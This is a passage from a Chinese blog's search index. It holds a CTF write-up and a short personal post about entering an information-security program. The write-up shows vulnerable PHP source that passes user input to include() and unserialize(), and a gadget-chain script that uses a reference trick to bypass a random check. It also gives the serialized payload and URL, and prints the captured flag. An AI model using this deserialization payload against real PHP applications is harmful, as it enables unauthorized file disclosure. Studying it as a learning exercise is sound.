punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>空白页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>overlay<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hero<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>这是一个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>空白页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>别找了小hacker, 这里什么都没有<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?phperror_reporting(0);$file = $_GET["file"];$p = $_GET["p"];if (isset($file)) {    echo 'NONONO' . '&lt;br>';    if (preg_match("/flag/", $file)) {        die('HACKER GOGOGO!!!');    }    @include($file);    if (isset($p)) {        $p = unserialize($p);    } else {        echo "NONONO";    }}?></span><span class="token comment" spellcheck="true">&lt;!-- You can try ?file=xxxx, and check the code in try.php --></span></code></pre><p>来审计一下源码:</p><p>try.php 中highlight_file()函数输出了$f指向的文件源码，所以当Flag实例执行了 Get_flag函数就能读出传入的文件。</p><p>try.php 中当Flag对象对创建，可以将flag文件名赋值给它，当这个实例销毁 时，就会打印出flag了。</p><p>$b = new  Flag(‘flag.php’);</p><p>而Get_Flag()函数在Seri类的__destruct()函数中执行，因此。</p><p>$a =new Seri($b);</p><p>但是这里</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194928.png" srcset="/img/loading.gif" alt=""></p><p>需要绕过，开始想的是爆破随机数种子，后来想了想。只需要将$b-&gt;t1 = &amp;$b-&gt;t2,即t1指向t2指向的地址，当t2指向的地址的值改变了，t1的值也就变了.</p><p>那么很简单的链条就出来了</p><p>$b = new  Flag(‘flag.php’);</p><p>$b-&gt;t1 = &amp;$b-&gt;t2；</p><p>$a =new Seri($b);</p><p>echo serialize($a);</p><p>然后file=try.php&amp;p=payload，就可以了.</p><p>payload脚本：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Seri</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$alize</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$alize</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">alize</span> <span class="token operator">=</span> <span class="token variable">$alize</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">alize</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$t1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$t2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Another construction!!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出源码</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Seri</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>生成反序列化结果：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194500.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Seri"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"alize"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token string">"fd00d3474e495e7b6d5f9f575b2d7ec4"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t2 "</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>payload:</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token keyword">try</span><span class="token punctuation">.</span>php<span class="token operator">&amp;</span>p<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Seri"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"alize"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token string">"fd00d3474e495e7b6d5f9f575b2d7ec4"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t2 "</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>得到flag:</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194607.png" srcset="/img/loading.gif" alt=""></p><h3 id="FLAG值：-5"><a href="#FLAG值：-5" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p>flag{95718502-3c3d-493e-a069-8097b939b2da}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>new page</title>
    <link href="/binary/new-page/"/>
    <url>/binary/new-page/</url>
    
    <content type="html"><![CDATA[<h4 id="近况："><a href="#近况：" class="headerlink" title="近况："></a>近况：</h4><p>博客搭建好久了，但一直都没有好好整理过文章</p><p>转专业考试结束了，应该可以顺利的进入信安专业学习</p><p>今天换了hexo 的主题，感觉简单点看起来也更舒适一些吧</p><p>以后要慢慢开始记录自己学习成长的经历了</p><p>也感谢一直陪在我身边鼓励我的朋友们</p><p>Fighting！！</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192420.jpg" srcset="/img/loading.gif" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>binary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
